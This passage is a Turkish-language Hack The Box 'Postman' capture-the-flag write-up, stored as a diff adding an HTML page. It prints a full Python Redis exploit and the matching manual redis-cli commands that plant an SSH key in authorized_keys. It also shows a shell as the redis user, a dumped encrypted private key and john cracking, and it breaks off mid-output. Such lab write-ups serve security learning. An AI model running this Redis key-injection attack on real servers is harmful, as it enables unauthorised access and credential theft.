@@ -1,0 +1,540 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <title>[HTB] Postman Writeup</title><link rel="stylesheet" type="text/css" href="/assets/main-dark.css"></head>
+<body>
+    <div class="container"><header>
+  <div class="menu">
+    <ul><li><a href="/">Index of /</a></li><li><a href="/about.html">| Biz Kimiz</a></li><li><a href="/writeup.html">| Writeup</a></li><li><a href="/red.html">| Red Team</a></li><li><a href="/blue.html">| Blue Team</a></li></ul>
+  </div>
+</header>
+<main>
+      <p><em>HTB Postman</em></p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nano /etc/hosts  <span class="o">&gt;&gt;&gt;&gt;&gt;</span>  10.10.10.160    postman.htb
+</code></pre></div></div>
+<ul>
+  <li>Enumeration:</li>
+</ul>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop# nmap <span class="nt">-sV</span> <span class="nt">-sC</span> <span class="nt">-p-</span> postman.htb 
+Starting Nmap 7.80 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2019-11-16 03:06 +03
+Nmap scan report <span class="k">for </span>postman.htb <span class="o">(</span>10.10.10.160<span class="o">)</span>
+Host is up <span class="o">(</span>0.082s latency<span class="o">)</span><span class="nb">.</span>
+Not shown: 65531 closed ports
+PORT      STATE SERVICE VERSION
+22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   2048 46:83:4f:f1:38:61:c0:1c:74:cb:b5:d1:4a:68:4d:77 <span class="o">(</span>RSA<span class="o">)</span>
+|   256 2d:8d:27:d2:df:15:1a:31:53:05:fb:ff:f0:62:26:89 <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 ca:7c:82:aa:5a:d3:72:ca:8b:8a:38:3a:80:41:a0:45 <span class="o">(</span>ED25519<span class="o">)</span>
+80/tcp    open  http    Apache httpd 2.4.29 <span class="o">((</span>Ubuntu<span class="o">))</span>
+|_http-server-header: Apache/2.4.29 <span class="o">(</span>Ubuntu<span class="o">)</span>
+|_http-title: The Cyber Geek<span class="s1">'s Personal Website
+6379/tcp  open  redis   Redis key-value store 4.0.9
+10000/tcp open  http    MiniServ 1.910 (Webmin httpd)
+|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/html<span class="p">;</span> <span class="nv">Charset</span><span class="o">=</span>iso-8859-1<span class="o">)</span><span class="nb">.</span>
+Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ <span class="nb">.</span>
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>103.92 seconds
+</code></pre></div></div>
+
+<p>elde edilen çıktı doğrultusunda 4 adet port açık olduğu görülmüştür.Bu aşamada ilk olarak 80 portunda ne var diye oraya bir gitmemizde fayda var, daha sonra 6379 ve 10000 de çalışan servisleri kontrol edeceğiz.</p>
+
+<ul>
+  <li>http://postman.htb/ adresine gittiğimizde bizi bir web sitesi karşılıyor bu noktada aklımıza ilk gelebilecek şey herhangi bir dizin mevcut mu ? sorusu oluyor , bunun için wfuzz aracı yardımıyla directory brute-force işlemi gerçekleştirip enumeration aşamamızı biraz daha ileri götürüyoruz.
+```sh
+root@kali:~/Desktop# wfuzz -w /usr/share/wordlists/dirb/big.txt -u http://postman.htb/FUZZ –hc=404,500 -c</li>
+</ul>
+
+<hr />
+<ul>
+  <li>Wfuzz 2.4 - The Web Fuzzer                           *
+<strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong><strong>**</strong>**</li>
+</ul>
+
+<p>Target: http://postman.htb/FUZZ
+Total requests: 20469</p>
+
+<p>===================================================================
+ID           Response   Lines    Word     Chars       Payload  <br />
+===================================================================</p>
+
+<p>000000015:   403        11 L     32 W     295 Ch      “.htaccess”
+000000016:   403        11 L     32 W     295 Ch      “.htpasswd”
+000005517:   301        9 L      28 W     308 Ch      “css”    <br />
+000007795:   301        9 L      28 W     310 Ch      “fonts”  <br />
+000009378:   301        9 L      28 W     311 Ch      “images” <br />
+000010190:   301        9 L      28 W     307 Ch      “js”     <br />
+000016215:   403        11 L     32 W     299 Ch      “server-status”     <br />
+000018744:   301        9 L      28 W     311 Ch      “upload”</p>
+
+<p>Total time: 146.0312
+Processed Requests: 20469
+Filtered Requests: 20461
+Requests/sec.: 140.1686</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>İlgili adreste directory brute-force işleminde sonra elde edilenler yukarıdaki gibi , ilgi çekici dizinlerden biri upload dizini oluyor fakat ilgili dizinden herhangi bir bilgi elde edemiyoruz veya dosya yükleyemiyoruz.Bu aşamada 80 portu ile ilgili yaptığımız enumeration süreci sonlanıyor.
+
+* Port 6379 Redis key-value store 4.0.9
+
+İlgili porta ait olan servisle ilgili ufak bir google araştırmasından sonra karşımıza https://github.com/Avinash-acid/Redis-Server-Exploit adresindeki exploitimiz çıkıyor.
+
+İlgili exploit , Redis sunucusunun düzgün bir şekilde yapılandırılmaması ve herhangi bir kontrol mekanizması olmadan internete açılmasından faydalanarak bize bir adet shell sağlıyor.
+
+tabii bu shell'i bize sağlaması için içeriden valid bir kullanıcı elde etmemizi veya bilmemizi bekliyor.(Bu noktada çok basit bir deneme yaparak "redis" user'ını denedim.)
+</code></pre></div></div>
+<p>Valid User : redis</p>
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Bu ufak ön bilgilendirmeden sonra exploit kodu içerisine gidip neyi nasıl yapıyor bir bakıyoruz ; 
+```sh
+#!/usr/bin/python
+#Author : Avinash Kumar Thapa aka -Acid
+#Twitter : https://twitter.com/m_avinash143
+#####################################################################################################################################################
+
+import os
+import os.path
+from sys import argv
+from termcolor import colored
+
+
+script, ip_address, username = argv
+
+
+PATH='/usr/bin/redis-cli'
+PATH1='/usr/local/bin/redis-cli'
+
+def ssh_connection():
+	shell = "ssh -i " + '$HOME/.ssh/id_rsa ' + username+"@"+ip_address
+	os.system(shell)
+
+if os.path.isfile(PATH) or os.path.isfile(PATH1):
+	try:
+    		print colored('\t*******************************************************************', "green")
+    		print colored('\t* [+] [Exploit] Exploiting misconfigured REDIS SERVER*' ,"green")
+    		print colored('\t* [+] AVINASH KUMAR THAPA aka "-Acid"                                ', "green")
+		print colored('\t*******************************************************************', "green")
+		print "\n"
+		print colored("\t SSH Keys Need to be Generated", 'blue')
+		os.system('ssh-keygen -t rsa -C \"acid_creative\"')
+		print colored("\t Keys Generated Successfully", "blue")
+		os.system("(echo '\r\n\'; cat $HOME/.ssh/id_rsa.pub; echo  \'\r\n\') &gt; $HOME/.ssh/public_key.txt")
+		cmd = "redis-cli -h " + ip_address + ' flushall'
+		cmd1 = "redis-cli -h " + ip_address
+		os.system(cmd)
+		cmd2 = "cat $HOME/.ssh/public_key.txt | redis-cli -h " +  ip_address + ' -x set cracklist'
+		os.system(cmd2)
+		cmd3 = cmd1 + ' config set dbfilename "backup.db" '
+		cmd4 = cmd1 + ' config set  dir' + " /home/"+username+"/.ssh/"
+		cmd5 = cmd1 + ' config set dbfilename "authorized_keys" '
+		cmd6 = cmd1 + ' save'
+		os.system(cmd3)
+		os.system(cmd4)
+		os.system(cmd5)
+		os.system(cmd6)
+		print colored("\tYou'll get shell in sometime..Thanks for your patience", "green")
+		ssh_connection()
+
+	except:
+		print "Something went wrong"
+else:
+	print colored("\tRedis-cli:::::This utility is not present on your system. You need to install it to proceed further.", "red")
+
+</code></pre></div></div>
+<ul>
+  <li>
+    <p>kodumuz bize, SSH üzerinden geçerli bir kullanıcıyla bağlantı kurmak için RSA anahtarı enjekte edebileceğini söylemiş…
+Aynı şekilde python scripti dışında  bir de poc de manuel explotation için mevcut bu noktada ben poc üzerinden gitmeyi tercih ettim.</p>
+  </li>
+  <li>
+    <p>POC —–»»» https://packetstormsecurity.com/files/134200/Redis-Remote-Command-Execution.html</p>
+
+    <p>yine poc dışında faydalandığım diğer bir kaynak ise https://redis.io/commands adresindeki komutlar oldu , redis-cli uygulması ile ilgili dizinleri keşfedeceğimiz komutları ve yolları buradan araştırdım.</p>
+  </li>
+</ul>
+
+<p>Poc’yi uygulamaya geçmeden önce ilgili zafiyette bahsedilen RSA enjeksiyon olayı için doğru bir path lazım , bu noktada redis-cli uygulamamızı kullanarak ihtiyacımız olan bilgileri toplayacağız (<em>username</em>/.ssh);</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/htb-machines/payloads# redis-cli <span class="nt">-h</span> postman.htb
+postman.htb:6379&gt; config get <span class="k">*</span>
+  1<span class="o">)</span> <span class="s2">"dbfilename"</span>
+  2<span class="o">)</span> <span class="s2">"authorized_keys"</span>
+  3<span class="o">)</span> <span class="s2">"requirepass"</span>
+  4<span class="o">)</span> <span class="s2">""</span>
+  5<span class="o">)</span> <span class="s2">"masterauth"</span>
+  6<span class="o">)</span> <span class="s2">""</span>
+  7<span class="o">)</span> <span class="s2">"cluster-announce-ip"</span>
+  8<span class="o">)</span> <span class="s2">""</span>
+  9<span class="o">)</span> <span class="s2">"unixsocket"</span>
+ 10<span class="o">)</span> <span class="s2">""</span>
+ 11<span class="o">)</span> <span class="s2">"logfile"</span>
+ 12<span class="o">)</span> <span class="s2">"/var/log/redis/redis-server.log"</span>
+ 13<span class="o">)</span> <span class="s2">"pidfile"</span>
+ 14<span class="o">)</span> <span class="s2">"/var/run/redis/redis-server.pid"</span>
+ 15<span class="o">)</span> <span class="s2">"slave-announce-ip"</span>
+ 16<span class="o">)</span> <span class="s2">""</span>
+ 17<span class="o">)</span> <span class="s2">"maxmemory"</span>
+ 18<span class="o">)</span> <span class="s2">"0"</span>
+ 19<span class="o">)</span> <span class="s2">"proto-max-bulk-len"</span>
+ 20<span class="o">)</span> <span class="s2">"536870912"</span>
+ 21<span class="o">)</span> <span class="s2">"client-query-buffer-limit"</span>
+ 22<span class="o">)</span> <span class="s2">"1073741824"</span>
+ 23<span class="o">)</span> <span class="s2">"maxmemory-samples"</span>
+ 24<span class="o">)</span> <span class="s2">"5"</span>
+ 25<span class="o">)</span> <span class="s2">"lfu-log-factor"</span>
+ 26<span class="o">)</span> <span class="s2">"10"</span>
+ 27<span class="o">)</span> <span class="s2">"lfu-decay-time"</span>
+ 28<span class="o">)</span> <span class="s2">"1"</span>
+ 29<span class="o">)</span> <span class="s2">"timeout"</span>
+ 30<span class="o">)</span> <span class="s2">"0"</span>
+ 31<span class="o">)</span> <span class="s2">"active-defrag-threshold-lower"</span>
+ 32<span class="o">)</span> <span class="s2">"10"</span>
+ 33<span class="o">)</span> <span class="s2">"active-defrag-threshold-upper"</span>
+ 34<span class="o">)</span> <span class="s2">"100"</span>
+ 35<span class="o">)</span> <span class="s2">"active-defrag-ignore-bytes"</span>
+ 36<span class="o">)</span> <span class="s2">"104857600"</span>
+ 37<span class="o">)</span> <span class="s2">"active-defrag-cycle-min"</span>
+ 38<span class="o">)</span> <span class="s2">"25"</span>
+ 39<span class="o">)</span> <span class="s2">"active-defrag-cycle-max"</span>
+ 40<span class="o">)</span> <span class="s2">"75"</span>
+ 41<span class="o">)</span> <span class="s2">"auto-aof-rewrite-percentage"</span>
+ 42<span class="o">)</span> <span class="s2">"100"</span>
+ 43<span class="o">)</span> <span class="s2">"auto-aof-rewrite-min-size"</span>
+ 44<span class="o">)</span> <span class="s2">"67108864"</span>
+ 45<span class="o">)</span> <span class="s2">"hash-max-ziplist-entries"</span>
+ 46<span class="o">)</span> <span class="s2">"512"</span>
+ 47<span class="o">)</span> <span class="s2">"hash-max-ziplist-value"</span>
+ 48<span class="o">)</span> <span class="s2">"64"</span>
+ 49<span class="o">)</span> <span class="s2">"list-max-ziplist-size"</span>
+ 50<span class="o">)</span> <span class="s2">"-2"</span>
+ 51<span class="o">)</span> <span class="s2">"list-compress-depth"</span>
+ 52<span class="o">)</span> <span class="s2">"0"</span>
+ 53<span class="o">)</span> <span class="s2">"set-max-intset-entries"</span>
+ 54<span class="o">)</span> <span class="s2">"512"</span>
+ 55<span class="o">)</span> <span class="s2">"zset-max-ziplist-entries"</span>
+ 56<span class="o">)</span> <span class="s2">"128"</span>
+ 57<span class="o">)</span> <span class="s2">"zset-max-ziplist-value"</span>
+ 58<span class="o">)</span> <span class="s2">"64"</span>
+ 59<span class="o">)</span> <span class="s2">"hll-sparse-max-bytes"</span>
+ 60<span class="o">)</span> <span class="s2">"3000"</span>
+ 61<span class="o">)</span> <span class="s2">"lua-time-limit"</span>
+ 62<span class="o">)</span> <span class="s2">"5000"</span>
+ 63<span class="o">)</span> <span class="s2">"slowlog-log-slower-than"</span>
+ 64<span class="o">)</span> <span class="s2">"10000"</span>
+ 65<span class="o">)</span> <span class="s2">"latency-monitor-threshold"</span>
+ 66<span class="o">)</span> <span class="s2">"0"</span>
+ 67<span class="o">)</span> <span class="s2">"slowlog-max-len"</span>
+ 68<span class="o">)</span> <span class="s2">"128"</span>
+ 69<span class="o">)</span> <span class="s2">"port"</span>
+ 70<span class="o">)</span> <span class="s2">"6379"</span>
+ 71<span class="o">)</span> <span class="s2">"cluster-announce-port"</span>
+ 72<span class="o">)</span> <span class="s2">"0"</span>
+ 73<span class="o">)</span> <span class="s2">"cluster-announce-bus-port"</span>
+ 74<span class="o">)</span> <span class="s2">"0"</span>
+ 75<span class="o">)</span> <span class="s2">"tcp-backlog"</span>
+ 76<span class="o">)</span> <span class="s2">"511"</span>
+ 77<span class="o">)</span> <span class="s2">"databases"</span>
+ 78<span class="o">)</span> <span class="s2">"16"</span>
+ 79<span class="o">)</span> <span class="s2">"repl-ping-slave-period"</span>
+ 80<span class="o">)</span> <span class="s2">"10"</span>
+ 81<span class="o">)</span> <span class="s2">"repl-timeout"</span>
+ 82<span class="o">)</span> <span class="s2">"60"</span>
+ 83<span class="o">)</span> <span class="s2">"repl-backlog-size"</span>
+ 84<span class="o">)</span> <span class="s2">"1048576"</span>
+ 85<span class="o">)</span> <span class="s2">"repl-backlog-ttl"</span>
+ 86<span class="o">)</span> <span class="s2">"3600"</span>
+ 87<span class="o">)</span> <span class="s2">"maxclients"</span>
+ 88<span class="o">)</span> <span class="s2">"10000"</span>
+ 89<span class="o">)</span> <span class="s2">"watchdog-period"</span>
+ 90<span class="o">)</span> <span class="s2">"0"</span>
+ 91<span class="o">)</span> <span class="s2">"slave-priority"</span>
+ 92<span class="o">)</span> <span class="s2">"100"</span>
+ 93<span class="o">)</span> <span class="s2">"slave-announce-port"</span>
+ 94<span class="o">)</span> <span class="s2">"0"</span>
+ 95<span class="o">)</span> <span class="s2">"min-slaves-to-write"</span>
+ 96<span class="o">)</span> <span class="s2">"0"</span>
+ 97<span class="o">)</span> <span class="s2">"min-slaves-max-lag"</span>
+ 98<span class="o">)</span> <span class="s2">"10"</span>
+ 99<span class="o">)</span> <span class="s2">"hz"</span>
+100<span class="o">)</span> <span class="s2">"10"</span>
+101<span class="o">)</span> <span class="s2">"cluster-node-timeout"</span>
+102<span class="o">)</span> <span class="s2">"15000"</span>
+103<span class="o">)</span> <span class="s2">"cluster-migration-barrier"</span>
+104<span class="o">)</span> <span class="s2">"1"</span>
+105<span class="o">)</span> <span class="s2">"cluster-slave-validity-factor"</span>
+106<span class="o">)</span> <span class="s2">"10"</span>
+107<span class="o">)</span> <span class="s2">"repl-diskless-sync-delay"</span>
+108<span class="o">)</span> <span class="s2">"5"</span>
+109<span class="o">)</span> <span class="s2">"tcp-keepalive"</span>
+110<span class="o">)</span> <span class="s2">"300"</span>
+111<span class="o">)</span> <span class="s2">"cluster-require-full-coverage"</span>
+112<span class="o">)</span> <span class="s2">"yes"</span>
+113<span class="o">)</span> <span class="s2">"cluster-slave-no-failover"</span>
+114<span class="o">)</span> <span class="s2">"no"</span>
+115<span class="o">)</span> <span class="s2">"no-appendfsync-on-rewrite"</span>
+116<span class="o">)</span> <span class="s2">"no"</span>
+117<span class="o">)</span> <span class="s2">"slave-serve-stale-data"</span>
+118<span class="o">)</span> <span class="s2">"yes"</span>
+119<span class="o">)</span> <span class="s2">"slave-read-only"</span>
+120<span class="o">)</span> <span class="s2">"yes"</span>
+121<span class="o">)</span> <span class="s2">"stop-writes-on-bgsave-error"</span>
+122<span class="o">)</span> <span class="s2">"yes"</span>
+123<span class="o">)</span> <span class="s2">"daemonize"</span>
+124<span class="o">)</span> <span class="s2">"yes"</span>
+125<span class="o">)</span> <span class="s2">"rdbcompression"</span>
+126<span class="o">)</span> <span class="s2">"yes"</span>
+127<span class="o">)</span> <span class="s2">"rdbchecksum"</span>
+128<span class="o">)</span> <span class="s2">"yes"</span>
+129<span class="o">)</span> <span class="s2">"activerehashing"</span>
+130<span class="o">)</span> <span class="s2">"yes"</span>
+131<span class="o">)</span> <span class="s2">"activedefrag"</span>
+132<span class="o">)</span> <span class="s2">"no"</span>
+133<span class="o">)</span> <span class="s2">"protected-mode"</span>
+134<span class="o">)</span> <span class="s2">"no"</span>
+135<span class="o">)</span> <span class="s2">"repl-disable-tcp-nodelay"</span>
+136<span class="o">)</span> <span class="s2">"no"</span>
+137<span class="o">)</span> <span class="s2">"repl-diskless-sync"</span>
+138<span class="o">)</span> <span class="s2">"no"</span>
+139<span class="o">)</span> <span class="s2">"aof-rewrite-incremental-fsync"</span>
+140<span class="o">)</span> <span class="s2">"yes"</span>
+141<span class="o">)</span> <span class="s2">"aof-load-truncated"</span>
+142<span class="o">)</span> <span class="s2">"yes"</span>
+143<span class="o">)</span> <span class="s2">"aof-use-rdb-preamble"</span>
+144<span class="o">)</span> <span class="s2">"no"</span>
+145<span class="o">)</span> <span class="s2">"lazyfree-lazy-eviction"</span>
+146<span class="o">)</span> <span class="s2">"no"</span>
+147<span class="o">)</span> <span class="s2">"lazyfree-lazy-expire"</span>
+148<span class="o">)</span> <span class="s2">"no"</span>
+149<span class="o">)</span> <span class="s2">"lazyfree-lazy-server-del"</span>
+150<span class="o">)</span> <span class="s2">"no"</span>
+151<span class="o">)</span> <span class="s2">"slave-lazy-flush"</span>
+152<span class="o">)</span> <span class="s2">"no"</span>
+153<span class="o">)</span> <span class="s2">"maxmemory-policy"</span>
+154<span class="o">)</span> <span class="s2">"noeviction"</span>
+155<span class="o">)</span> <span class="s2">"loglevel"</span>
+156<span class="o">)</span> <span class="s2">"notice"</span>
+157<span class="o">)</span> <span class="s2">"supervised"</span>
+158<span class="o">)</span> <span class="s2">"no"</span>
+159<span class="o">)</span> <span class="s2">"appendfsync"</span>
+160<span class="o">)</span> <span class="s2">"everysec"</span>
+161<span class="o">)</span> <span class="s2">"syslog-facility"</span>
+162<span class="o">)</span> <span class="s2">"local0"</span>
+163<span class="o">)</span> <span class="s2">"appendonly"</span>
+164<span class="o">)</span> <span class="s2">"no"</span>
+165<span class="o">)</span> <span class="s2">"dir"</span>
+166<span class="o">)</span> <span class="s2">"/var/lib/redis/.ssh"</span>
+167<span class="o">)</span> <span class="s2">"save"</span>
+168<span class="o">)</span> <span class="s2">"900 1 300 10 60 10000"</span>
+169<span class="o">)</span> <span class="s2">"client-output-buffer-limit"</span>
+170<span class="o">)</span> <span class="s2">"normal 0 0 0 slave 268435456 67108864 60 pubsub 33554432 8388608 60"</span>
+171<span class="o">)</span> <span class="s2">"unixsocketperm"</span>
+172<span class="o">)</span> <span class="s2">"0"</span>
+173<span class="o">)</span> <span class="s2">"slaveof"</span>
+174<span class="o">)</span> <span class="s2">"10.10.14.23 4444"</span>
+175<span class="o">)</span> <span class="s2">"notify-keyspace-events"</span>
+176<span class="o">)</span> <span class="s2">""</span>
+177<span class="o">)</span> <span class="s2">"bind"</span>
+178<span class="o">)</span> <span class="s2">"0.0.0.0 ::1"</span>
+</code></pre></div></div>
+<p>şimdi gelelim shell alma kısmına burada poc’yi takip ederek sırasıyla işlemlerimizi gerçekleştiriyoruz ;</p>
+
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/.ssh# <span class="o">(</span><span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="p">;</span> <span class="nb">cat</span> ./id_rsa.pub<span class="p">;</span> <span class="nb">echo</span> <span class="nt">-e</span> <span class="s2">"</span><span class="se">\n\n</span><span class="s2">"</span><span class="o">)</span> <span class="o">&gt;</span> foo.txt
+root@kali:~/.ssh# <span class="nb">ls
+</span>foo.txt  id_rsa  id_rsa.pub
+root@kali:~/.ssh# <span class="nb">cat </span>foo.txt | redis-cli <span class="nt">-h</span> 10.10.10.160 <span class="nt">-x</span> <span class="nb">set </span>crackit
+OK
+root@kali:~/.ssh# redis-cli <span class="nt">-h</span> 10.10.10.160
+10.10.10.160:6379&gt; config <span class="nb">set dir</span> /var/lib/redis/.ssh
+OK
+10.10.10.160:6379&gt; config <span class="nb">set </span>dbfilename <span class="s2">"authorized_keys"</span>
+OK
+10.10.10.160:6379&gt; save
+OK
+10.10.10.160:6379&gt; quit
+root@kali:~/.ssh# ssh <span class="nt">-i</span> id_rsa
+id_rsa      id_rsa.pub  
+root@kali:~/.ssh# ssh <span class="nt">-i</span> id_rsa
+id_rsa      id_rsa.pub  
+root@kali:~/.ssh# ssh <span class="nt">-i</span> id_rsa redis@postman.htb
+The authenticity of host <span class="s1">'postman.htb (10.10.10.160)'</span> can<span class="s1">'t be established.
+ECDSA key fingerprint is SHA256:kea9iwskZTAT66U8yNRQiTa6t35LX8p0jOpTfvgeCh0.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>postman.htb,10.10.10.160<span class="s1">' (ECDSA) to the list of known hosts.
+Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-58-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+ * Canonical Livepatch is available for installation.
+   - Reduce system reboots and improve kernel security. Activate at:
+     https://ubuntu.com/livepatch
+Last login: Mon Aug 26 03:04:25 2019 from 10.10.10.1
+redis@Postman:~$ 
+</span></code></pre></div></div>
+
+<p>shell’i aldıktan sonra içerideki user.txt dosyamızı okuyup okuyamadığımızı kontrol etmek amacıyla ;</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis@Postman:/home/Matt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> 
+total 52
+drwxr-xr-x 6 Matt Matt 4096 Sep 11 11:28 <span class="nb">.</span>
+drwxr-xr-x 3 root root 4096 Sep 11 11:27 ..
+<span class="nt">-rw-------</span> 1 Matt Matt 1676 Sep 11 11:46 .bash_history
+<span class="nt">-rw-r--r--</span> 1 Matt Matt  220 Aug 25 15:10 .bash_logout
+<span class="nt">-rw-r--r--</span> 1 Matt Matt 3771 Aug 25 15:10 .bashrc
+drwx------ 2 Matt Matt 4096 Aug 25 18:20 .cache
+drwx------ 3 Matt Matt 4096 Aug 25 23:23 .gnupg
+drwxrwxr-x 3 Matt Matt 4096 Aug 25 23:29 .local
+<span class="nt">-rw-r--r--</span> 1 Matt Matt  807 Aug 25 15:10 .profile
+<span class="nt">-rw-rw-r--</span> 1 Matt Matt   66 Aug 26 00:48 .selected_editor
+drwx------ 2 Matt Matt 4096 Aug 26 00:04 .ssh
+<span class="nt">-rw-rw----</span> 1 Matt Matt   33 Aug 26 03:07 user.txt
+<span class="nt">-rw-rw-r--</span> 1 Matt Matt  181 Aug 25 18:22 .wget-hsts
+redis@Postman:/home/Matt<span class="nv">$ </span><span class="nb">cat </span>user.txt
+<span class="nb">cat</span>: user.txt: Permission denied
+</code></pre></div></div>
+<p>İlgili kullanıcıya sahip olamamız sebebiyle user.txt dosyasını okuyamadık , bu aşamada sistem içerisindeki dizinler gezilirken /opt dizini içerisindeki dosya dikkat çekiyor ;</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>redis@Postman:/opt<span class="nv">$ </span><span class="nb">ls
+</span>id_rsa.bak
+redis@Postman:/opt<span class="nv">$ </span><span class="nb">ls</span> <span class="nt">-la</span> 
+total 12
+drwxr-xr-x  2 root root 4096 Sep 11 11:28 <span class="nb">.</span>
+drwxr-xr-x 22 root root 4096 Aug 25 15:03 ..
+<span class="nt">-rwxr-xr-x</span>  1 Matt Matt 1743 Aug 26 00:11 id_rsa.bak
+redis@Postman:/opt<span class="nv">$ </span><span class="nb">cat </span>id_rsa.bak 
+<span class="nt">-----BEGIN</span> RSA PRIVATE KEY-----
+Proc-Type: 4,ENCRYPTED
+DEK-Info: DES-EDE3-CBC,73E9CEFBCCF5287C
+
+JehA51I17rsCOOVqyWx+C8363IOBYXQ11Ddw/pr3L2A2NDtB7tvsXNyqKDghfQnX
+cwGJJUD9kKJniJkJzrvF1WepvMNkj9ZItXQzYN8wbjlrku1bJq5xnJX9EUb5I7k2
+7GsTwsMvKzXkkfEZQaXK/T50s3I4Cdcfbr1dXIyabXLLpZOiZEKvr4+KySjp4ou6
+cdnCWhzkA/TwJpXG1WeOmMvtCZW1HCButYsNP6BDf78bQGmmlirqRmXfLB92JhT9
+1u8JzHCJ1zZMG5vaUtvon0qgPx7xeIUO6LAFTozrN9MGWEqBEJ5zMVrrt3TGVkcv
+EyvlWwks7R/gjxHyUwT+a5LCGGSjVD85LxYutgWxOUKbtWGBbU8yi7YsXlKCwwHP
+UH7OfQz03VWy+K0aa8Qs+Eyw6X3wbWnue03ng/sLJnJ729zb3kuym8r+hU+9v6VY
+Sj+QnjVTYjDfnT22jJBUHTV2yrKeAz6CXdFT+xIhxEAiv0m1ZkkyQkWpUiCzyuYK
+t+MStwWtSt0VJ4U1Na2G3xGPjmrkmjwXvudKC0YN/OBoPPOTaBVD9i6fsoZ6pwnS
+5Mi8BzrBhdO0wHaDcTYPc3B00CwqAV5MXmkAk2zKL0W2tdVYksKwxKCwGmWlpdke
+P2JGlp9LWEerMfolbjTSOU5mDePfMQ3fwCO6MPBiqzrrFcPNJr7/McQECb5sf+O6
+jKE3Jfn0UVE2QVdVK3oEL6DyaBf/W2d/3T7q10Ud7K+4Kd36gxMBf33Ea6+qx3Ge
+SbJIhksw5TKhd505AiUH2Tn89qNGecVJEbjKeJ/vFZC5YIsQ+9sl89TmJHL74Y3i
+l3YXDEsQjhZHxX5X/RU02D+AF07p3BSRjhD30cjj0uuWkKowpoo0Y0eblgmd7o2X
+0VIWrskPK4I7IH5gbkrxVGb/9g/W2ua1C3Nncv3MNcf0nlI117BS/QwNtuTozG8p
+S9k3li+rYr6f3ma/ULsUnKiZls8SpU+RsaosLGKZ6p2oIe8oRSmlOCsY0ICq7eRR
+hkuzUuH9z/mBo2tQWh8qvToCSEjg8yNO9z8+LdoN1wQWMPaVwRBjIyxCPHFTJ3u+
+Zxy0tIPwjCZvxUfYn/K4FVHavvA+b9lopnUCEAERpwIv8+tYofwGVpLVC0DrN58V
+XTfB2X9sL1oB3hO4mJF0Z3yJ2KZEdYwHGuqNTFagN0gBcyNI2wsxZNzIK26vPrOD
+b6Bc9UdiWCZqMKUx4aMTLhG5ROjgQGytWf/q7MGrO3cF25k1PEWNyZMqY4WYsZXi
+WhQFHkFOINwVEOtHakZ/ToYaUQNtRT6pZyHgvjT0mTo0t3jUERsppj1pwbggCGmh
+KTkmhK+MTaoy89Cg0Xw2J18Dm0o78p6UNrkSue1CsWjEfEIF3NAMEU2o+Ngq92Hm
+npAFRetvwQ7xukk0rbb6mvF8gSqLQg7WpbZFytgS05TpPZPM0h8tRE8YRdJheWrQ
+VcNyZH8OHYqES4g2UF62KpttqSwLiiF4utHq+/h5CQwsF+JRg88bnxh2z2BD6i5W
+X+hK5HPpp6QnjZ8A5ERuUEGaZBEUvGJtPGHjZyLpkytMhTjaOrRNYw<span class="o">==</span>
+<span class="nt">-----END</span> RSA PRIVATE KEY-----
+redis@Postman:/opt<span class="nv">$ </span>
+</code></pre></div></div>
+<p>Matt kullanıcısına ait private key dosyasının backup hali karşımıza çıktı ve ilgili dosyaya john ile brute-force yaparak parolayı elde edebileceğiz.</p>
+
+<p>İlk olarak id_rsa.bak dosyasının hash’ini almamız gerekiyor ;</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/htb-machines/payloads# python ssh2john.py id_rsa.bak <span class="o">&gt;</span> RSA.hash
+</code></pre></div></div>
+<p>Sonrasında john ile brute-force işlemimizi başlatıyoruz ;</p>
+<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop# john <span class="nt">--wordlist</span><span class="o">=</span>rockyou.txt RSA.hash 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>SSH <span class="o">[</span>RSA/DSA/EC/OPENSSH <span class="o">(</span>SSH private keys<span class="o">)</span> 32/64]<span class="o">)</span>
+Cost 1 <span class="o">(</span>KDF/cipher <span class="o">[</span><span class="nv">0</span><span class="o">=</span>MD5/AES <span class="nv">1</span><span class="o">=</span>MD5/3DES <span class="nv">2</span><span class="o">=</span>Bcrypt/AES]<span class="o">)</span> is 1 <span class="k">for </span>all loaded hashes
+Cost 2 <span class="o">(</span>iteration count<span class="o">)</span> is 2 <span class="k">for </span>all loaded hashes
+Will run 4 OpenMP threads
+Note: This format may emit <span class="nb">false </span>positives, so it will keep trying even after
